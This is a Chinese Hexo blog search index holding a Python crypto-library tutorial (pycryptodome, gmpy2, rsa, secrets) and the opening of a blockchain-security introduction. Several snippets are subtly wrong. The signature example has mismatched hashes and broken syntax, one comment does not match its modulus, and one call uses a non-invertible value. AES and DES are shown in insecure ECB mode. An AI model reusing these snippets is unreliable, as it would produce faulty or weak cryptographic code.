<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python 第三方库学习</title>
    <url>/2020/12/15/1/</url>
    <content><![CDATA[<h1 id="Crypto库"><a href="#Crypto库" class="headerlink" title="Crypto库"></a>Crypto库</h1><div class="table-container">
<table>
<thead>
<tr>
<th>Package</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/cipher/cipher.html">Crypto.Cipher</a></td>
<td>Modules for protecting <strong>confidentiality</strong> that is, for encrypting and decrypting data (example: AES).</td>
</tr>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/signature/signature.html">Crypto.Signature</a></td>
<td>Modules for assuring <strong>authenticity</strong>, that is, for creating and verifying digital signatures of messages (example: PKCS#1 v1.5).</td>
</tr>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/hash/hash.html">Crypto.Hash</a></td>
<td>Modules for creating cryptographic <strong>digests</strong> (example: SHA-256).</td>
</tr>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/public_key/public_key.html">Crypto.PublicKey</a></td>
<td>Modules for generating, exporting or importing <em>public keys</em> (example: RSA or ECC).</td>
</tr>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/protocol/protocol.html">Crypto.Protocol</a></td>
<td>Modules for faciliting secure communications between parties, in most cases by leveraging cryptograpic primitives from other modules (example: Shamir’s Secret Sharing scheme).</td>
</tr>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/io/io.html">Crypto.IO</a></td>
<td>Modules for dealing with encodings commonly used for cryptographic data (example: PEM).</td>
</tr>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/random/random.html">Crypto.Random</a></td>
<td>Modules for generating random data.</td>
</tr>
<tr>
<td><a href="https://www.pycryptodome.org/en/latest/src/util/util.html">Crypto.Util</a></td>
<td>General purpose routines (example: XOR for byte strings).</td>
</tr>
</tbody>
</table>
</div>
<p>简而言之</p>
<p>常见对称密码在 Crypto.Cipher 库下，主要有： <code>DES 3DES AES RC4 Salsa20</code><br>        非对称密码在 Crypto.PublicKey 库下，主要有： <code>RSA ECC DSA</code><br>        哈希密码在 Crypto.Hash 库下，常用的有： <code>MD5 SHA-1 SHA-128 SHA-256</code><br>        随机数在 Crypto.Random 库下<br>        实用小工具在 Crypto.Util 库下<br>        数字签名在 Crypto.Signature 库下</p>
<h2 id="AES加解密"><a href="#AES加解密" class="headerlink" title="AES加解密"></a>AES加解密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">&#x27;this_is_a_key&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27; &#x27;</span>),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt</span></span><br><span class="line">plain_text = <span class="built_in">bytes</span>(<span class="string">&#x27;this_is_a_plain&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27; &#x27;</span>),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">text_enc = aes.encrypt(plain_text)</span><br><span class="line">text_enc_b64 = base64.b64encode(text_enc)</span><br><span class="line">print(text_enc_b64.decode(encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt</span></span><br><span class="line">msg_enc = base64.b64decode(text_enc_b64)</span><br><span class="line">msg = aes.decrypt(msg_enc)</span><br><span class="line">print(msg.decode(encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>注意：key和明文是需要填充到指定位数的，可以使用<code>ljust</code>或者<code>zfill</code>之类的填充，也可以用<code>Util中的pad()</code>函数填充！</p>
<h2 id="对称密码DES"><a href="#对称密码DES" class="headerlink" title="对称密码DES"></a>对称密码DES</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">&#x27;test_key&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">des = DES.new(key,DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt</span></span><br><span class="line">plain_text = <span class="built_in">bytes</span>(<span class="string">&#x27;this_is_a_plain&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27; &#x27;</span>),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">text_enc = des.encrypt(plain_text)</span><br><span class="line">text_enc_b64 = base64.b64encode(text_enc)</span><br><span class="line">print(text_enc_b64.decode(encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt</span></span><br><span class="line">msg_enc = base64.b64decode(text_enc_b64)</span><br><span class="line">msg = des.decrypt(msg_enc)</span><br><span class="line">print(msg.decode(encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h2 id="非对称密码RSA"><a href="#非对称密码RSA" class="headerlink" title="非对称密码RSA"></a>非对称密码RSA</h2><p>这个库的 RSA 主要是用来<code>生成</code>公钥文件/私钥文件或者<code>读取</code>公钥文件/私钥文件<br>生成公/私钥文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">rsa = RSA.generate(<span class="number">2048</span>) <span class="comment"># 返回的是密钥对象</span></span><br><span class="line"></span><br><span class="line">public_pem = rsa.publickey().exportKey(<span class="string">&#x27;PEM&#x27;</span>) <span class="comment"># 生成公钥字节流</span></span><br><span class="line">private_pem = rsa.exportKey(<span class="string">&#x27;PEM&#x27;</span>) <span class="comment"># 生成私钥字节流</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;public.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(public_pem) <span class="comment"># 将字节流写入文件</span></span><br><span class="line">f.close()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(private_pem) <span class="comment"># 将字节流写入文件</span></span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArreg3IX19DbszqSdBKhR</span><br><span class="line">9cm495XAk9PBQJwHiwjKv6S1Tk5h7xL9/fPZIITy1M1k8LwuoSJPac/zcK6rYgMb</span><br><span class="line">DT9tmVLbi6CdWNl5agvUE2WgsB/eifEcfnZ9KiT9xTrpmj5BJql9H+znseA1AzlP</span><br><span class="line">iTukrH1frD3SzZIVnq/pBly3QbsT13UdUhbmIgeqTo8wL9V0Sj+sMFOIZY+xHscK</span><br><span class="line">IeDOv4/JIxw0q2TMTsE3HRgAX9CXvk6u9zJCH3EEzl0w9EQr8TT7ql3GJg2hJ9SD</span><br><span class="line">biebjImLuUii7Nv20qLOpIJ8qR6O531kmQ1gykiSfqj6AHqxkufxTHklCsHj9B8F</span><br><span class="line">8QIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEArreg3IX19DbszqSdBKhR9cm495XAk9PBQJwHiwjKv6S1Tk5h</span><br><span class="line">7xL9/fPZIITy1M1k8LwuoSJPac/zcK6rYgMbDT9tmVLbi6CdWNl5agvUE2WgsB/e</span><br><span class="line">ifEcfnZ9KiT9xTrpmj5BJql9H+znseA1AzlPiTukrH1frD3SzZIVnq/pBly3QbsT</span><br><span class="line">13UdUhbmIgeqTo8wL9V0Sj+sMFOIZY+xHscKIeDOv4/JIxw0q2TMTsE3HRgAX9CX</span><br><span class="line">vk6u9zJCH3EEzl0w9EQr8TT7ql3GJg2hJ9SDbiebjImLuUii7Nv20qLOpIJ8qR6O</span><br><span class="line">531kmQ1gykiSfqj6AHqxkufxTHklCsHj9B8F8QIDAQABAoI...</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">读取公/私钥文件加解密：</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_encrypt</span>(<span class="params">plain</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;public.pem&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        key = RSA.importKey(data)</span><br><span class="line">        rsa = PKCS1_v1_5.new(key)</span><br><span class="line">        cipher = rsa.encrypt(plain)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        key = RSA.importKey(data)</span><br><span class="line">        rsa = PKCS1_v1_5.new(key)</span><br><span class="line">        plain = rsa.decrypt(base64.b64decode(cipher),<span class="string">&#x27;ERROR&#x27;</span>) <span class="comment"># &#x27;ERROR&#x27;必需</span></span><br><span class="line">        <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    plain_text = <span class="string">b&#x27;This_is_a_test_string!&#x27;</span></span><br><span class="line">    cipher = rsa_encrypt(plain_text)</span><br><span class="line">    print(cipher)</span><br><span class="line">    plain = rsa_decrypt(cipher)</span><br><span class="line">    print(plain)</span><br></pre></td></tr></table></figure>
<p>注意：RSA 有两种填充方式，一种是 <code>PKCS1_v1_5</code>，另一种是 <code>PKCS1_OAEP</code></p>
<h2 id="Hash算法"><a href="#Hash算法" class="headerlink" title="Hash算法"></a>Hash算法</h2><p>和 <code>hashlib</code> 库的用法类似，先实例化某个 Hash 算法，再用 update() 调用就可以了！</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA1,MD5</span><br><span class="line"></span><br><span class="line">sha1 = SHA1.<span class="keyword">new</span>()</span><br><span class="line">sha1.update(b<span class="string">&#x27;sha1_test&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sha1.digest()) <span class="comment"># 返回字节串</span></span><br><span class="line"><span class="built_in">print</span>(sha1.hexdigest()) <span class="comment"># 返回16进制字符串</span></span><br><span class="line">md5 = MD5.<span class="keyword">new</span>()</span><br><span class="line">md5.update(b<span class="string">&#x27;md5_test&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(md5.hexdigest())</span><br></pre></td></tr></table></figure>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>发送发用私钥签名，验证方用公钥验证</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">from Crypto.Signature import pkcs1_15</span><br><span class="line">from Crypto.Hash import SHA256</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line"># 签名</span><br><span class="line">message = &#x27;To be signed&#x27;</span><br><span class="line">key = <span class="module-access"><span class="module"><span class="identifier">RSA</span>.</span></span>import<span class="constructor">_key(<span class="params">open</span>(&#x27;<span class="params">private_key</span>.<span class="params">der</span>&#x27;)</span>.read<span class="literal">()</span>)</span><br><span class="line">h = <span class="module-access"><span class="module"><span class="identifier">SHA256</span>.</span></span><span class="keyword">new</span>(message)</span><br><span class="line">signature = pkcs1_15.<span class="keyword">new</span>(key).sign(h)</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">key = <span class="module-access"><span class="module"><span class="identifier">RSA</span>.</span></span>import<span class="constructor">_key(<span class="params">open</span>(&#x27;<span class="params">public_key</span>.<span class="params">der</span>&#x27;)</span>.read<span class="literal">()</span>)</span><br><span class="line">h = <span class="module-access"><span class="module"><span class="identifier">SHA</span>.</span></span><span class="keyword">new</span>(message)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pkcs1_15.<span class="keyword">new</span>(key).verify(h, signature):</span><br><span class="line">    print <span class="string">&quot;The signature is valid.&quot;</span></span><br><span class="line">    except (ValueError, TypeError):</span><br><span class="line">        print <span class="string">&quot;The signature is not valid.&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><p>和 <code>random</code> 库类似。第一个函数很常用</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">import Crypto.Random</span><br><span class="line">import <span class="module-access"><span class="module"><span class="identifier">Crypto</span>.</span><span class="module"><span class="identifier">Random</span>.</span></span>random</span><br><span class="line"></span><br><span class="line">print(<span class="module-access"><span class="module"><span class="identifier">Crypto</span>.</span><span class="module"><span class="identifier">Random</span>.</span></span>get<span class="constructor">_random_bytes(4)</span>) # 得到n字节的随机字节串</span><br><span class="line">print(<span class="module-access"><span class="module"><span class="identifier">Crypto</span>.</span><span class="module"><span class="identifier">Random</span>.</span></span>random.randrange(<span class="number">1</span>,<span class="number">10</span>,<span class="number">1</span>)) # x到y之间的整数，可以给定step</span><br><span class="line">print(<span class="module-access"><span class="module"><span class="identifier">Crypto</span>.</span><span class="module"><span class="identifier">Random</span>.</span></span>random.randint(<span class="number">1</span>,<span class="number">10</span>)) # x到y之间的整数</span><br><span class="line">print(<span class="module-access"><span class="module"><span class="identifier">Crypto</span>.</span><span class="module"><span class="identifier">Random</span>.</span></span>random.getrandbits(<span class="number">16</span>)) # 返回一个最大为N bit的随机整数</span><br></pre></td></tr></table></figure>
<h2 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h2><p>常用到 Util 中的<code>pad()</code>函数来填充密钥</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Util.Padding import *</span><br><span class="line"></span><br><span class="line"><span class="meta"># 按照规定的几种类型 pad，自定义 pad可以用 ljust()或者 zfill()</span></span><br><span class="line">str1 = b&#x27;helloworld&#x27;</span><br><span class="line">pad_str1 = <span class="built_in">pad</span>(str1,<span class="number">16</span>,&#x27;pkcs7&#x27;) <span class="meta"># 填充类型默认为&#x27;pkcs7&#x27;，还有&#x27;iso7816&#x27;和&#x27;x923&#x27;</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">unpad</span>(pad_str1,<span class="number">16</span>))</span><br><span class="line"><span class="meta"># number</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">GCD</span>(<span class="number">11</span>,<span class="number">143</span>)) <span class="meta"># 最大公约数</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">bytes_to_long</span>(b&#x27;hello&#x27;)) <span class="meta"># 字节转整数</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">long_to_bytes</span>(<span class="number">0x41424344</span>)) <span class="meta"># 整数转字节</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">getPrime</span>(<span class="number">16</span>)) <span class="meta"># 返回一个最大为 N bit 的随机素数</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">getStrongPrime</span>(<span class="number">512</span>)) <span class="meta"># 返回强素数</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">inverse</span>(<span class="number">10</span>,<span class="number">5</span>)) <span class="meta"># 求逆元</span></span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">isPrime</span>(<span class="number">1227</span>)) <span class="meta"># 判断是不是素数</span></span><br></pre></td></tr></table></figure>
<h1 id="gmpy2库"><a href="#gmpy2库" class="headerlink" title="gmpy2库"></a>gmpy2库</h1><h2 id="gmpy2常见函数使用"><a href="#gmpy2常见函数使用" class="headerlink" title="gmpy2常见函数使用"></a>gmpy2常见函数使用</h2><p><strong>1.初始化大整数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.mpz(<span class="number">909090</span>)</span><br><span class="line"></span><br><span class="line">result:mpz(<span class="number">909090</span>)</span><br></pre></td></tr></table></figure>
<p><strong>2.求大整数a,b的最大公因数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.gcd(<span class="number">6</span>,<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">result:mpz(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<p><strong>3.求大整数x模m的逆元y</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#4*6 ≡ 1 mod 23</span></span><br><span class="line">gmpy2.invert(<span class="number">4</span>,<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">result:mpz(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<p><strong>4.检验大整数是否为偶数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_even(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">result:<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_even(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">result:<span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p><strong>5.检验大整数是否为奇数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_odd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">result:<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_odd(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">result:<span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p><strong>6.检验大整数是否为素数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_prime(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">result:<span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p><strong>7.求大整数x开n次根</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.iroot(<span class="number">81</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">result:(mpz(<span class="number">9</span>),<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p><strong>8.求大整数x的y次幂模m取余</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#2^4 mod 5 = 1</span></span><br><span class="line">gmpy2.powmod(<span class="number">2</span>,<span class="number">4</span>,<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">result:mpz(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><strong>9.扩展欧几里得</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="comment">#3*6+17*(-1) = (3,17)</span></span><br><span class="line"><span class="attribute">gmpy2</span>.gcdext(<span class="number">3</span>,<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">result</span>:(mpz(<span class="number">1</span>), mpz(<span class="number">6</span>), mpz(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<h1 id="RSA库"><a href="#RSA库" class="headerlink" title="RSA库"></a>RSA库</h1><p>仅对字节运行</p>
<h2 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(pubkey, privkey) = rsa.newkeys(<span class="number">512</span>, poolsize=<span class="number">8</span>)</span><br><span class="line"><span class="comment">#均为元组形式</span></span><br><span class="line"><span class="comment">#poolsize表示线程数</span></span><br><span class="line"><span class="comment">#accurate=True默认</span></span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>name</th>
<th>value</th>
</tr>
</thead>
<tbody>
<tr>
<td>pubkey</td>
<td>(n,e)</td>
</tr>
<tr>
<td>privkey</td>
<td>(n,e,d,p,q)</td>
</tr>
</tbody>
</table>
</div>
<p>实际测试生成4096位密钥需要50秒左右</p>
<h2 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h2><h3 id="rsa-encrypt-message，pubkey"><a href="#rsa-encrypt-message，pubkey" class="headerlink" title="rsa.encrypt(message，pubkey)"></a>rsa.encrypt(message，pubkey)</h3><h3 id="rsa-decrypt-crypto，prikey"><a href="#rsa-decrypt-crypto，prikey" class="headerlink" title="rsa.decrypt(crypto，prikey)"></a>rsa.decrypt(crypto，prikey)</h3><h3 id="过程演示"><a href="#过程演示" class="headerlink" title="过程演示"></a>过程演示</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(bob_pub, bob_priv) = rsa.newkeys(<span class="number">512</span>)</span><br><span class="line">message = <span class="string">&#x27;hello Bob!&#x27;</span>.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">crypto = rsa.encrypt(message, bob_pub)</span><br><span class="line">message = rsa.decrypt(crypto, bob_priv)</span><br><span class="line">print(message.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>如果加密消息被篡改会报错</p>
<h2 id="签名和验证"><a href="#签名和验证" class="headerlink" title="签名和验证"></a>签名和验证</h2><h3 id="rsa-sign"><a href="#rsa-sign" class="headerlink" title="rsa.sign()"></a>rsa.sign()</h3><p>为邮件创建分离签名</p>
<h3 id="rsa-verify"><a href="#rsa-verify" class="headerlink" title="rsa.verify()"></a>rsa.verify()</h3><p>验证签名，成功返回True</p>
<p>如果签名被篡改会报错</p>
<h2 id="函数格式"><a href="#函数格式" class="headerlink" title="函数格式"></a>函数格式</h2><ol>
<li><code>rsa.encrypt</code>(<em>message: bytes</em>, <em>pub_key: rsa.key.PublicKey</em>) → bytes</li>
<li><code>rsa.decrypt</code>(<em>crypto: bytes</em>, <em>priv_key: rsa.key.PrivateKey</em>) → bytes</li>
<li><code>rsa.sign</code>(<em>message: bytes</em>, <em>priv_key: rsa.key.PrivateKey</em>, <em>hash_method: str</em>) → bytes</li>
<li><code>rsa.verify</code>(<em>message: bytes</em>, <em>signature: bytes</em>, <em>pub_key: rsa.key.PublicKey</em>) → str</li>
<li><code>rsa.find_signature_hash</code>(<em>signature: bytes</em>, <em>pub_key: rsa.key.PublicKey</em>) → str  返回从签名中检测到的哈希名称</li>
</ol>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://stuvel.eu/python-rsa-doc/genindex.html">https://stuvel.eu/python-rsa-doc/genindex.html</a></p>
<h1 id="Secrets库"><a href="#Secrets库" class="headerlink" title="Secrets库"></a>Secrets库</h1><blockquote>
<p>secrets是python3.6加入到标准库的,使用secrets模块，可以生成适用于处理机密信息（如密码，帐户身份验证，安全令牌）的加密强随机数。</p>
</blockquote>
<h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br></pre></td></tr></table></figure>
<h3 id="SystemRandom"><a href="#SystemRandom" class="headerlink" title="SystemRandom"></a>SystemRandom</h3><p>它是使用OS提供的最高质量源生成随机数的类。 有关更多详细信息，请参阅random.SystemRandom。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">secrets</span><span class="selector-class">.SystemRandom</span>()</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">random</span><span class="selector-class">.SystemRandom</span> <span class="selector-tag">at</span> 0<span class="selector-tag">x7fd537094418</span>&gt;</span><br></pre></td></tr></table></figure>
<h3 id="choice-sequence"><a href="#choice-sequence" class="headerlink" title="choice(sequence)"></a>choice(sequence)</h3><p>从非空序列中选择一个元素。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">secrets</span>.choice([<span class="number">23</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br></pre></td></tr></table></figure>
<h3 id="randbelow"><a href="#randbelow" class="headerlink" title="randbelow"></a>randbelow</h3><p>[0,n) 取0-n之间的整数</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">secrets</span>.randbelow(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">6</span></span><br></pre></td></tr></table></figure>
<h3 id="randbits-k"><a href="#randbits-k" class="headerlink" title="randbits(k)"></a>randbits(k)</h3><p>随机不超过k位的整数</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">secrets</span>.randbits(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">426</span></span><br></pre></td></tr></table></figure>
<h2 id="token生成"><a href="#token生成" class="headerlink" title="token生成"></a>token生成</h2><p>secret模块还提供用于生成适合于重置密码和难以想象的URL的安全令牌的功能。</p>
<h3 id="token-bytes"><a href="#token-bytes" class="headerlink" title="token_bytes"></a>token_bytes</h3><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">secrets.token_bytes(nbytes=10)</span><br><span class="line"></span><br><span class="line">b&#x27;<span class="symbol">\x</span>ca<span class="symbol">\x</span>feQ<span class="symbol">\x</span>03&amp;<span class="symbol">\x</span>8b7<span class="symbol">\x</span>d7&amp;<span class="symbol">\x</span>af&#x27;</span><br></pre></td></tr></table></figure>
<p>返回包含nbytes个字节的字节字符串。 如果nbytes为None或未给出，则使用有效的默认值。</p>
<h3 id="token-hex"><a href="#token-hex" class="headerlink" title="token_hex"></a>token_hex</h3><p>返回十六进制随机文本字符串。 该字符串有n个字节的随机字节，每个字节转换为两个十六进制数字。 如果nbytes为None或未给出，则使用有效的默认值。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">secrets.token_hex()</span><br><span class="line"></span><br><span class="line">&#x27;494ee83c2a42ce3dc488b059eb64a<span class="number">50628667</span>e9f2c939a<span class="number">8767</span>2d3d6a<span class="number">174825</span>2a&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="token-urlsafe"><a href="#token-urlsafe" class="headerlink" title="token_urlsafe"></a>token_urlsafe</h3><p>返回随机字节为nbytes的URL安全文本字符串。 文本以Base64编码，每个字节平均约为1.3个字符。 如果nbytes为None或未给出，则使用有效的默认值。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">secrets.token_urlsafe()</span><br><span class="line"></span><br><span class="line">&#x27;giZFsPv9ch4OGWvuqihEIkj0LwOsHDOjgGHoqDeTvb8&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="compare-digest"><a href="#compare-digest" class="headerlink" title="compare_digest"></a>compare_digest</h3><p>字符串比较的安全方式,减少攻击风险。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">secrets.compare_digest(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;E&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全入门</title>
    <url>/2021/03/10/12/</url>
    <content><![CDATA[<h1 id="区块链学习"><a href="#区块链学习" class="headerlink" title="区块链学习"></a>区块链学习</h1><p><img src="/2021/03/10/12/image-20210306223141693.png" alt="avatar"></p>
<h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><p><img src="/2021/03/10/12/image-20210306221505322.png" alt="avatar"></p>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p><strong>Smart Contract，是一种旨在以信息化方式传播、验证或执行合同的计算机协议</strong></p>
<p>本质上来说，智能合约是一段程序，它以计算机指令的方式实现了传统合约的自动化处理。简单讲，智能合约就是双方在区块链资产上交易时，触发执行的一段代码，这段代码就是智能合约。“智能合约程序不只是一个可以自动执行的计算机程序，它本身就是一个系统参与者，对接收到的信息进行回应，可以接收和储存价值，也可以向外发送信息和价值。这个程序就像一个可以被信任的人，可以临时保管资产，总是按照事先的规则执行操作。”</p>
<p>智能合约的设计目标是，执行一般的合同条件，最大限度地减少恶意和意外的状况，最大限度地减少使用信任中介</p>
